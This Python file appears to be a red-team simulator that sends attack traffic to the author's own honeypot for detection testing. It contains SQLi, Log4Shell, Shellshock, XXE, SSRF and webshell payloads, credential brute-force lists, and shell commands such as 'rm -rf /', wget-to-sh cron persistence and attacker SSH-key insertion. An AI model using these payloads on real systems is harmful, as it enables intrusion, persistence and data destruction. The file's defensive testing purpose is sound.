#!/usr/bin/env python3
"""
GullakTrap Attack Simulator  --  red-team harness for your OWN honeypot.

This tool fires realistic attacker traffic at the GullakTrap sensors so you
can verify the whole pipeline end to end: capture -> classify (MITRE ATT&CK)
-> alerting -> the live dashboard. It talks the exact dialect each sensor
parses (HTTP attack strings + scanner User-Agents + header-borne exploits, an
FTP brute force with PASV/LIST/RETR/DELE, an SSH password brute force + fake
shell, and a Telnet IoT-style login + commands), so every scenario below
lights up a specific detection and technique in classify.py.

SAFE BY DESIGN
--------------
* The default target is 127.0.0.1 -- your local honeypot.
* Aiming at any non-loopback/non-private host is refused unless you pass
  --yes-i-own-this, because this only belongs against systems you operate.
* Malware "download" URLs use the RFC 5737 documentation range
  (198.51.100.0/24), which is not routable, so nothing real is ever fetched.

Usage
-----
    python attack_sim.py                      # attack all sensors on localhost
    python attack_sim.py --only http,ssh      # just those two
    python attack_sim.py --brute 8            # 8 creds per brute-force sensor
    python attack_sim.py --scenario brute     # only the credential brute force
    python attack_sim.py --scenario exploit,malware   # web exploits + payloads

Scenarios (comma-separated, default "all"):
    recon    banner grabs, scanner User-Agents, directory/system probes
    brute    credential brute force against every login
    exploit  SQLi / XSS / traversal / LFI / Log4Shell / Shellshock / SSRF / XXE
    malware  wget/curl payload fetches (ingress tool transfer)
    shell    post-login shell commands + file read / download / delete
    persist  SSH-key and cron persistence, history wiping

Requires: paramiko (already in requirements.txt). Everything else is stdlib.
"""

import argparse
import http.client
import ipaddress
import socket
import sys
import time

try:
    import paramiko
except ImportError:  # keep HTTP/FTP/Telnet usable even without paramiko
    paramiko = None

# --------------------------------------------------------------------------
# console theming (degrades to plain text where ANSI is unsupported)
# --------------------------------------------------------------------------
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding='utf-8', errors='replace')
    except (AttributeError, ValueError, OSError):
        pass

_USE_COLOR = sys.stdout.isatty()

ALL_SCENARIOS = ('recon', 'brute', 'exploit', 'malware', 'shell', 'persist')


def _c(code, text):
    return f'\033[{code}m{text}\033[0m' if _USE_COLOR else text


def hit(msg):    print('  ' + _c('92', '[+] ') + msg)        # green  = sent
def info(msg):   print('  ' + _c('96', '[*] ') + msg)        # cyan   = note
def warn(msg):   print('  ' + _c('93', '[!] ') + msg)        # yellow = warn
def fail(msg):   print('  ' + _c('91', '[x] ') + msg)        # red    = error
def head(msg):   print('\n' + _c('95;1', '=== %s ===' % msg))  # magenta


def want(scen, *cats):
    """True if any of `cats` is selected (or everything is)."""
    return 'all' in scen or any(c in scen for c in cats)


# A malware URL in the documentation range -- never resolves to a real host.
PAYLOAD_URL = 'http://198.51.100.34/bins/mirai.arm7'


class Stats:
    """Tally of what we exercised, printed as the closing report."""

    def __init__(self):
        self.events = 0
        self.per_proto = {}
        self.errors = []

    def fired(self, proto, label):
        self.events += 1
        self.per_proto.setdefault(proto, []).append(label)
        hit(label)

    def error(self, proto, msg):
        self.errors.append((proto, msg))
        fail(msg)


# ==========================================================================
# HTTP  (default sensor port 8080)
# ==========================================================================
def attack_http(host, port, stats, brute, scen=('all',)):
    head('HTTP  %s:%d' % (host, port))

    def send(method, path, headers=None, body=None, label=None):
        try:
            conn = http.client.HTTPConnection(host, port, timeout=8)
            conn.request(method, path, body=body, headers=headers or {})
            resp = conn.getresponse()
            resp.read()
            conn.close()
            stats.fired('http', label or '%s %s -> %s' % (method, path, resp.status))
            return resp.status
        except (OSError, ValueError) as e:
            # ValueError: http.client refuses raw spaces/control chars in a URL.
            stats.error('http', '%s %s failed: %s' % (method, path, e))
            return None

    # 1. benign recon knock (GET Request -> T1595)
    if want(scen, 'recon'):
        send('GET', '/', {'User-Agent': 'Mozilla/5.0'},
             label='Recon: GET / (benign browser)')

    # 2. injection / traversal families -- each maps to a critical technique.
    # The sensor matches raw (still URL-encoded) substrings and never decodes,
    # so we use URL-safe token forms that http.client will transmit unchanged
    # yet still contain the exact needles classify.py looks for.
    if want(scen, 'exploit', 'malware'):
        injections = [
            ("SQL injection (T1190)",    "/products?id=1=1+union+select+concat--"),
            ("XSS attempt (T1059.007)",  "/search?q=javascript:onerror=onload=onclick="),
            ("Path traversal (T1083)",   "/download?file=../../../../etc/passwd"),
            ("Command injection (T1059)","/ping?host=x;wget+" + PAYLOAD_URL + "||curl"),
            ("File inclusion (T1190)",   "/index.php?page=php://input"),
        ]
        for label, path in injections:
            send('GET', path, {'User-Agent': 'curl/7.68.0'},
                 label='Web attack: ' + label)

    # 2b. header-borne exploits -- these hide in headers, not the URL, so they
    # exercise the sensor's header inspection (Log4Shell/Shellshock/SSRF/XXE).
    if want(scen, 'exploit'):
        send('GET', '/', {'User-Agent': '${jndi:ldap://198.51.100.34/a}'},
             label='Web attack: Log4Shell via User-Agent (T1190)')
        send('GET', '/', {'User-Agent': '() { :;}; echo shellshock',
                          'Referer': '() { :;}; /bin/bash -c id'},
             label='Web attack: Shellshock via headers (T1059)')
        send('GET', '/fetch?url=http://169.254.169.254/latest/meta-data/',
             {'User-Agent': 'curl/7.68.0'},
             label='Web attack: SSRF to cloud metadata (T1190)')
        xxe = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
               '"file:///etc/passwd">]><r>&x;</r>')
        send('POST', '/api/xml', {'Content-Type': 'application/xml',
                                  'Content-Length': str(len(xxe))}, xxe,
             label='Web attack: XXE external entity (T1190)')

    # 3. scanner fingerprints via User-Agent (Scanner Detected -> T1595)
    if want(scen, 'recon'):
        for ua in ('Mozilla/5.00 (Nikto/2.1.6)', 'sqlmap/1.7',
                   'Nmap Scripting Engine', 'Mozilla/5.0 (compatible; Nessus)'):
            send('GET', '/admin/', {'User-Agent': ua},
                 label='Scanner UA: ' + ua.split('(')[-1].rstrip(')'))

    # 4. credential-theft POST to the fake login (Credential Theft -> T1110)
    if want(scen, 'brute'):
        body = 'username=admin&password=admin123'
        send('POST', '/login', {'Content-Type': 'application/x-www-form-urlencoded',
                                'Content-Length': str(len(body))}, body,
             label='Credential POST to /login (admin/admin123)')

        # 5. brute-force burst against the login form
        for i in range(brute):
            b = 'username=root&password=%s' % ['123456', 'password', 'root', 'toor',
                                               'admin', 'letmein', 'qwerty', '12345678'][i % 8]
            send('POST', '/login', {'Content-Type': 'application/x-www-form-urlencoded',
                                    'Content-Length': str(len(b))}, b,
                 label='Brute #%d root/%s' % (i + 1, b.split('=')[-1]))

    # 6. file-upload + destructive verbs
    if want(scen, 'exploit', 'malware'):
        up = ('------x\r\nContent-Disposition: form-data; name="f"; filename="shell.php"\r\n\r\n'
              '<?php system($_GET["c"]); ?>\r\n------x--\r\n')
        send('POST', '/upload', {'Content-Type': 'multipart/form-data; boundary=----x',
                                'Content-Length': str(len(up))}, up,
             label='Webshell upload attempt (shell.php)')
        send('PUT', '/shell.jsp', {'Content-Length': '0'}, '',
             label='PUT /shell.jsp (upload verb)')
        send('DELETE', '/index.html', label='DELETE /index.html (destructive verb)')


# ==========================================================================
# FTP  (default sensor port 2121) -- raw socket, speaks the sensor's dialect
# ==========================================================================
def _ftp_line(sock):
    buf = b''
    sock.settimeout(8)
    while not buf.endswith(b'\n'):
        chunk = sock.recv(256)
        if not chunk:
            break
        buf += chunk
    return buf.decode('utf-8', 'ignore').strip()


def _ftp_cmd(sock, cmd):
    sock.sendall((cmd + '\r\n').encode())
    return _ftp_line(sock)


def attack_ftp(host, port, stats, brute, scen=('all',)):
    head('FTP  %s:%d' % (host, port))
    try:
        s = socket.create_connection((host, port), timeout=8)
    except OSError as e:
        stats.error('ftp', 'connect failed: %s' % e)
        return
    try:
        _ftp_line(s)  # greeting

        # 1. credential brute force (Username Provided / Password Attempt -> T1110)
        if want(scen, 'brute'):
            creds = [('anonymous', 'anonymous@'), ('admin', 'admin'), ('root', 'root'),
                     ('ftp', 'ftp'), ('test', 'test'), ('user', '123456'),
                     ('oracle', 'oracle'), ('www', 'www')]
            for i in range(brute):
                u, p = creds[i % len(creds)]
                _ftp_cmd(s, 'USER %s' % u)
                r = _ftp_cmd(s, 'PASS %s' % p)
                stats.fired('ftp', 'Brute #%d %s/%s -> %s' % (i + 1, u, p, r[:3]))
        else:
            # still authenticate so recon/file steps have a session
            _ftp_cmd(s, 'USER anonymous')
            _ftp_cmd(s, 'PASS anonymous@')

        # 2. recon
        if want(scen, 'recon'):
            _ftp_cmd(s, 'SYST');  stats.fired('ftp', 'SYST (system fingerprint)')
            _ftp_cmd(s, 'PWD');   stats.fired('ftp', 'PWD (working dir)')
            _ftp_cmd(s, 'CWD /etc'); stats.fired('ftp', 'CWD /etc (directory change)')
            # 3. passive-mode directory listing (List Request -> T1083)
            _ftp_listing(s, host, stats)

        # 4. file download + destructive ops
        if want(scen, 'shell', 'malware'):
            _ftp_download(s, host, stats, 'secret.txt')
            _ftp_cmd(s, 'STOR backdoor.sh'); stats.fired('ftp', 'STOR backdoor.sh (upload attempt)')
            _ftp_cmd(s, 'DELE /etc/passwd')
            stats.fired('ftp', 'DELE /etc/passwd (delete attempt -> T1070)')

        _ftp_cmd(s, 'QUIT')
    finally:
        try:
            s.close()
        except OSError:
            pass


def _parse_pasv(resp):
    try:
        nums = resp.split('(')[1].split(')')[0].split(',')
        return int(nums[4]) * 256 + int(nums[5])
    except (IndexError, ValueError):
        return None


def _ftp_listing(sock, host, stats):
    pasv = _ftp_cmd(sock, 'PASV')
    dp = _parse_pasv(pasv)
    if not dp:
        return
    try:
        ds = socket.create_connection((host, dp), timeout=8)
        sock.sendall(b'LIST\r\n')
        _ftp_line(sock)          # 150
        ds.recv(8192); ds.close()
        _ftp_line(sock)          # 226
        stats.fired('ftp', 'LIST directory contents retrieved')
    except OSError as e:
        stats.error('ftp', 'LIST failed: %s' % e)


def _ftp_download(sock, host, stats, name):
    pasv = _ftp_cmd(sock, 'PASV')
    dp = _parse_pasv(pasv)
    if not dp:
        return
    try:
        ds = socket.create_connection((host, dp), timeout=8)
        sock.sendall(('RETR %s\r\n' % name).encode())
        first = _ftp_line(sock)
        if first.startswith('150'):
            ds.recv(65536)
            _ftp_line(sock)
        ds.close()
        stats.fired('ftp', 'RETR %s (file download -> T1005)' % name)
    except OSError as e:
        stats.error('ftp', 'RETR failed: %s' % e)


# ==========================================================================
# SSH  (default sensor port 2222) -- needs paramiko
# ==========================================================================
def attack_ssh(host, port, stats, brute, scen=('all',)):
    head('SSH  %s:%d' % (host, port))
    if paramiko is None:
        warn('paramiko not installed; skipping SSH. (pip install paramiko)')
        return

    logging_quiet()
    creds = [('root', '123456'), ('root', 'root'), ('admin', 'admin'),
             ('root', 'toor'), ('pi', 'raspberry'), ('root', 'password'),
             ('ubuntu', 'ubuntu'), ('root', 'admin')]

    # Whether we brute force or not, we need one live session for the shell
    # scenarios. When 'brute' is off we make a single quiet login.
    attempts = brute if want(scen, 'brute') else 1
    last_client = None
    for i in range(attempts):
        u, p = creds[i % len(creds)]
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(host, port=port, username=u, password=p,
                        look_for_keys=False, allow_agent=False, timeout=10,
                        banner_timeout=10, auth_timeout=10)
            if want(scen, 'brute'):
                stats.fired('ssh', 'Brute #%d %s/%s -> accepted' % (i + 1, u, p))
            if last_client:
                last_client.close()
            last_client = cli
        except Exception as e:  # noqa: BLE001 -- report any auth/transport failure
            stats.error('ssh', 'Brute #%d %s/%s: %s' % (i + 1, u, p, e))
            cli.close()

    if not (want(scen, 'shell', 'malware', 'persist')):
        if last_client:
            last_client.close()
        return

    if not last_client:
        warn('no SSH session established; skipping shell commands')
        return

    # Interactive fake shell: each command maps to a sensor detection.
    commands = []
    if want(scen, 'shell'):
        commands += [
            ('whoami',                       'recon: whoami'),
            ('uname -a',                     'recon: uname -a'),
            ('cat /etc/passwd',              'file read /etc/passwd (T1005)'),
            ('chmod 777 /tmp/x',             'permission change (T1222)'),
            ('rm -rf /var/log/*',            'destructive rm -rf (T1070)'),
        ]
    if want(scen, 'malware'):
        commands.append(
            ('wget %s -O /tmp/x' % PAYLOAD_URL, 'malware download via wget (T1105)'))
    if want(scen, 'persist'):
        commands += [
            ('echo ssh-rsa AAAAB3Nz attacker@evil >> /root/.ssh/authorized_keys',
             'ssh-key persistence (T1098)'),
            ('crontab -l 2>/dev/null; echo "* * * * * wget %s|sh" | crontab -' % PAYLOAD_URL,
             'cron persistence (T1053)'),
            ('history -c', 'history wipe / defense evasion (T1070)'),
        ]

    try:
        chan = last_client.invoke_shell()
        time.sleep(0.4)
        try:
            chan.recv(4096)
        except socket.timeout:
            pass
        for cmd, label in commands:
            chan.send(cmd + '\n')
            time.sleep(0.4)
            try:
                chan.recv(8192)
            except socket.timeout:
                pass
            stats.fired('ssh', 'shell cmd: ' + label)
        chan.close()
    except Exception as e:  # noqa: BLE001
        stats.error('ssh', 'shell failed: %s' % e)
    finally:
        last_client.close()


def logging_quiet():
    import logging
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)


# ==========================================================================
# Telnet  (default sensor port 2323) -- raw socket, IoT-botnet style
# ==========================================================================
def _tn_recv_until(sock, token=None, quiet=0.4, timeout=6.0):
    """Read until `token` (bytes) is seen or the stream is quiet for `quiet`
    seconds. Synchronising on the prompt -- instead of grabbing whatever the
    first packet happens to hold -- keeps the login and command phases in
    lock-step with the sensor, so every command lands as its own event."""
    sock.settimeout(quiet)
    end = time.time() + timeout
    data = b''
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break                 # quiet gap: the server is waiting on us
        if not chunk:
            break
        data += chunk
        if token and token in data:
            break
    return data


def attack_telnet(host, port, stats, brute, scen=('all',)):
    head('Telnet  %s:%d' % (host, port))
    creds = [('root', 'xc3511'), ('root', 'vizxv'), ('admin', 'admin'),
             ('root', 'root'), ('root', '888888'), ('root', 'juantech'),
             ('support', 'support'), ('root', '54321')]

    run_cmds = want(scen, 'shell', 'malware', 'persist')
    attempts = brute if want(scen, 'brute') else 1

    for i in range(attempts):
        u, p = creds[i % len(creds)]
        try:
            s = socket.create_connection((host, port), timeout=8)
        except OSError as e:
            stats.error('telnet', 'connect failed: %s' % e)
            return
        try:
            _tn_recv_until(s, b'login:')          # banner + "login:"
            s.sendall((u + '\r\n').encode())
            _tn_recv_until(s, b'assword')         # "Password:"
            s.sendall((p + '\r\n').encode())
            _tn_recv_until(s, b'#')               # welcome + shell prompt
            if want(scen, 'brute'):
                stats.fired('telnet', 'Login #%d %s/%s (credential capture)' % (i + 1, u, p))

            if i == 0 and run_cmds:  # run the command set once
                cmds = []
                if want(scen, 'shell'):
                    cmds += [
                        ('/bin/busybox MIRAI', 'IoT botnet probe (busybox MIRAI)'),
                        ('cat /proc/cpuinfo',  'recon: cpuinfo'),
                        ('rm -rf /',           'destructive rm -rf (T1070)'),
                    ]
                if want(scen, 'malware'):
                    cmds.append(('wget ' + PAYLOAD_URL, 'malware download via wget (T1105)'))
                if want(scen, 'persist'):
                    cmds.append(
                        ('echo ssh-rsa AAAAB3Nz attacker@evil >> /etc/dropbear/authorized_keys',
                         'ssh-key persistence (T1098)'))
                for cmd, label in cmds:
                    s.sendall((cmd + '\r\n').encode())
                    _tn_recv_until(s, b'#')
                    stats.fired('telnet', 'cmd: ' + label)
        finally:
            try:
                s.close()
            except OSError:
                pass


# ==========================================================================
# SMTP  (default sensor port 25) -- AUTH brute + open-relay probe
# ==========================================================================
def _smtp_line(sock):
    buf = b''
    sock.settimeout(8)
    while not buf.endswith(b'\n'):
        try:
            chunk = sock.recv(512)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buf += chunk
    return buf.decode('utf-8', 'ignore').strip()


def attack_smtp(host, port, stats, brute, scen=('all',)):
    import base64
    head('SMTP  %s:%d' % (host, port))
    try:
        s = socket.create_connection((host, port), timeout=8)
    except OSError as e:
        stats.error('smtp', 'connect failed: %s' % e)
        return
    try:
        _smtp_line(s)                                   # 220 greeting
        if want(scen, 'recon', 'brute'):
            s.sendall(b'EHLO scanner.local\r\n'); _smtp_line(s)
            stats.fired('smtp', 'EHLO capabilities probe')

        if want(scen, 'brute'):
            creds = [('admin', 'admin'), ('root', 'toor'), ('postmaster', '123456'),
                     ('test', 'test'), ('info', 'password'), ('sales', 'letmein'),
                     ('user', 'user'), ('mail', 'mail')]
            for i in range(brute):
                u, p = creds[i % len(creds)]
                s.sendall(b'AUTH LOGIN\r\n'); _smtp_line(s)
                s.sendall(base64.b64encode(u.encode()) + b'\r\n'); _smtp_line(s)
                s.sendall(base64.b64encode(p.encode()) + b'\r\n'); _smtp_line(s)
                stats.fired('smtp', 'AUTH LOGIN %s/%s (credential capture)' % (u, p))

        if want(scen, 'recon'):
            s.sendall(b'VRFY root\r\n'); _smtp_line(s)
            stats.fired('smtp', 'VRFY root (user enumeration)')

        if want(scen, 'exploit', 'malware'):
            s.sendall(b'MAIL FROM:<spammer@evil.example>\r\n'); _smtp_line(s)
            s.sendall(b'RCPT TO:<victim@gmail.com>\r\n'); _smtp_line(s)
            stats.fired('smtp', 'RCPT to external domain (open relay probe)')
            s.sendall(b'DATA\r\n'); _smtp_line(s)
            s.sendall(b'Subject: test\r\n\r\nrelay test\r\n.\r\n'); _smtp_line(s)
            stats.fired('smtp', 'DATA spam body queued')

        s.sendall(b'QUIT\r\n')
    finally:
        try:
            s.close()
        except OSError:
            pass


# ==========================================================================
# SNMP  (default sensor port 161/udp) -- community-string brute + MIB query
# ==========================================================================
def _snmp_tlv(tag, val):
    if len(val) < 0x80:
        length = bytes([len(val)])
    else:
        b = len(val).to_bytes((len(val).bit_length() + 7) // 8, 'big')
        length = bytes([0x80 | len(b)]) + b
    return bytes([tag]) + length + val


def _snmp_get(community, req_id=1):
    # GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0)
    oid = _snmp_tlv(0x06, b'\x2b\x06\x01\x02\x01\x01\x01\x00')
    varbind = _snmp_tlv(0x30, oid + b'\x05\x00')
    varbinds = _snmp_tlv(0x30, varbind)
    reqid = _snmp_tlv(0x02, bytes([req_id & 0x7f]))
    pdu = _snmp_tlv(0xA0, reqid + b'\x02\x01\x00' + b'\x02\x01\x00' + varbinds)
    version = b'\x02\x01\x00'                            # SNMPv1
    comm = _snmp_tlv(0x04, community.encode())
    return _snmp_tlv(0x30, version + comm + pdu)


def attack_snmp(host, port, stats, brute, scen=('all',)):
    head('SNMP  %s:%d (udp)' % (host, port))
    communities = ['public', 'private', 'community', 'manager', 'admin',
                   'cisco', 'default', 'snmpd']
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
    except OSError as e:
        stats.error('snmp', 'socket failed: %s' % e)
        return
    try:
        if want(scen, 'brute', 'recon'):
            n = brute if want(scen, 'brute') else 1
            for i in range(max(1, n)):
                c = communities[i % len(communities)]
                try:
                    s.sendto(_snmp_get(c, i + 1), (host, port))
                    try:
                        s.recvfrom(4096)
                    except socket.timeout:
                        pass
                    stats.fired('snmp', "community '%s' GET sysDescr (T1110/T1602)" % c)
                except OSError as e:
                    stats.error('snmp', "community '%s': %s" % (c, e))
    finally:
        try:
            s.close()
        except OSError:
            pass


# ==========================================================================
# SMB  (default sensor port 445) -- negotiate + IPC$ + EternalBlue pattern
# ==========================================================================
def _nb(payload):
    """Wrap an SMB payload in a NetBIOS session-service frame."""
    return b'\x00' + len(payload).to_bytes(3, 'big') + payload


def _smb1(cmd, body=b''):
    """A 32-byte SMBv1 header for `cmd`, plus an optional body."""
    hdr = (b'\xffSMB' + bytes([cmd]) + b'\x00\x00\x00\x00'   # status
           + b'\x18' + b'\x01\x28' + b'\x00\x00'             # flags, flags2, pidhigh
           + b'\x00' * 8 + b'\x00\x00'                       # signature, reserved
           + b'\x00\x00' + b'\xff\xfe' + b'\x00\x00' + b'\x00\x00')  # tid pid uid mid
    return hdr + body


def attack_smb(host, port, stats, brute, scen=('all',)):
    head('SMB  %s:%d' % (host, port))
    try:
        s = socket.create_connection((host, port), timeout=8)
        s.settimeout(4)
    except OSError as e:
        stats.error('smb', 'connect failed: %s' % e)
        return
    try:
        # 1. SMBv1 dialect negotiation
        dialects = b'\x02NT LM 0.12\x00'
        neg = _smb1(0x72, b'\x00' + len(dialects).to_bytes(2, 'little') + dialects)
        s.sendall(_nb(neg))
        try:
            s.recv(1024)
        except socket.timeout:
            pass
        stats.fired('smb', 'SMBv1 negotiate (recon)')

        if want(scen, 'brute'):
            # 2. session setup carrying an NTLMSSP-ish blob with a username
            blob = b'NTLMSSP\x00\x03\x00\x00\x00' + \
                   'admin'.encode('utf-16-le') + b'\x00\x00'
            s.sendall(_nb(_smb1(0x73, b'\x0c' + b'\x00' * 6 + blob)))
            stats.fired('smb', 'session setup / NTLM logon (admin)')

        if want(scen, 'recon', 'brute'):
            # 3. tree connect to IPC$ (share discovery)
            tc = b'\x00\x00' + b'\\\\%s\\IPC$\x00' % host.encode()
            s.sendall(_nb(_smb1(0x75, tc)))
            stats.fired('smb', 'tree connect \\\\IPC$ (share discovery)')

        if want(scen, 'exploit', 'malware'):
            # 4. Trans2 -- the MS17-010 / EternalBlue traffic shape
            s.sendall(_nb(_smb1(0x32, b'\x0f\x0c' + b'\x00' * 20)))
            stats.fired('smb', 'Trans2 request (EternalBlue / MS17-010 pattern)')

        try:
            s.recv(1024)
        except socket.timeout:
            pass
    finally:
        try:
            s.close()
        except OSError:
            pass


# ==========================================================================
# orchestration
# ==========================================================================
PROTOCOLS = {
    'http':   (attack_http, 8080),
    'ftp':    (attack_ftp, 2121),
    'ssh':    (attack_ssh, 2222),
    'telnet': (attack_telnet, 2323),
    'smb':    (attack_smb, 445),
    'smtp':   (attack_smtp, 25),
    'snmp':   (attack_snmp, 161),
}


def is_own_target(host):
    """True if host is loopback or RFC1918 private -- safe to hit freely."""
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return False
    for info in infos:
        try:
            addr = ipaddress.ip_address(info[4][0])
        except ValueError:
            continue
        if not (addr.is_loopback or addr.is_private):
            return False
    return True


def banner(host, chosen, scen):
    print(_c('95;1', r"""
   ____       _ _       _    _____
  / ___|_   _| | | __ _| | _|_   _| __ __ _ _ __
 | |  _| | | | | |/ _` | |/ / | || '__/ _` | '_ \
 | |_| | |_| | | | (_| |   <  | || | | (_| | |_) |
  \____|\__,_|_|_|\__,_|_|\_\ |_||_|  \__,_| .__/
   A T T A C K   S I M U L A T O R         |_|
"""))
    info('Target      : %s' % host)
    info('Sensors     : %s' % ', '.join(chosen))
    info('Scenarios   : %s' % ('all' if 'all' in scen else ', '.join(scen)))
    info('Payload URL : %s  (RFC 5737 docs range, non-routable)' % PAYLOAD_URL)


def report(stats, elapsed):
    head('SUMMARY')
    for proto in PROTOCOLS:
        events = stats.per_proto.get(proto)
        if events is None:
            continue
        print('  ' + _c('96', proto.upper().ljust(7)) + ' %d events fired' % len(events))
    print('  ' + '-' * 32)
    print('  ' + _c('92;1', 'TOTAL   %d attack events in %.1fs' % (stats.events, elapsed)))
    if stats.errors:
        warn('%d step(s) reported errors (sensor down or not started?):' % len(stats.errors))
        for proto, msg in stats.errors[:12]:
            print('       ' + _c('91', proto) + ': ' + msg)
    print()
    info('Now open the dashboard (http://127.0.0.1:5000) -> Analytics to see')
    info('these land as classified events with MITRE techniques and alerts.')


def main():
    ap = argparse.ArgumentParser(
        description='Fire simulated attacks at your own GullakTrap honeypot.')
    ap.add_argument('--host', default='127.0.0.1', help='honeypot host (default 127.0.0.1)')
    ap.add_argument('--only', help='comma list of sensors to attack (http,ftp,ssh,telnet)')
    ap.add_argument('--skip', help='comma list of sensors to skip')
    ap.add_argument('--scenario', default='all',
                    help='comma list of scenarios to run: %s (default all)'
                         % ', '.join(ALL_SCENARIOS))
    ap.add_argument('--brute', type=int, default=5,
                    help='credential attempts per brute-forceable sensor (default 5)')
    ap.add_argument('--delay', type=float, default=0.0,
                    help='seconds to pause between sensors (default 0)')
    for name, (_, dport) in PROTOCOLS.items():
        ap.add_argument('--%s-port' % name, type=int, default=dport,
                        help='%s sensor port (default %d)' % (name.upper(), dport))
    ap.add_argument('--yes-i-own-this', action='store_true',
                    help='required to target a non-local/non-private host you operate')
    args = ap.parse_args()

    chosen = list(PROTOCOLS)
    if args.only:
        chosen = [p.strip() for p in args.only.split(',') if p.strip() in PROTOCOLS]
    if args.skip:
        skip = {p.strip() for p in args.skip.split(',')}
        chosen = [p for p in chosen if p not in skip]
    if not chosen:
        ap.error('no valid sensors selected')

    scen = [s.strip().lower() for s in args.scenario.split(',') if s.strip()]
    bad = [s for s in scen if s not in ALL_SCENARIOS and s != 'all']
    if bad:
        ap.error('unknown scenario(s): %s (choose from %s, or all)'
                 % (', '.join(bad), ', '.join(ALL_SCENARIOS)))
    if not scen:
        scen = ['all']

    if not is_own_target(args.host) and not args.yes_i_own_this:
        fail('Target %s is not loopback/private.' % args.host)
        fail('This tool is only for honeypots YOU operate. If that is the case,')
        fail('re-run with --yes-i-own-this to confirm authorization.')
        sys.exit(2)

    banner(args.host, chosen, scen)
    stats = Stats()
    t0 = time.time()
    for name in chosen:
        func, _ = PROTOCOLS[name]
        port = getattr(args, '%s_port' % name)
        try:
            func(args.host, port, stats, max(1, args.brute), scen)
        except Exception as e:  # noqa: BLE001 -- one sensor failing must not stop the run
            stats.error(name, 'unexpected: %s' % e)
        if args.delay:
            time.sleep(args.delay)
    report(stats, time.time() - t0)


if __name__ == '__main__':
    main()
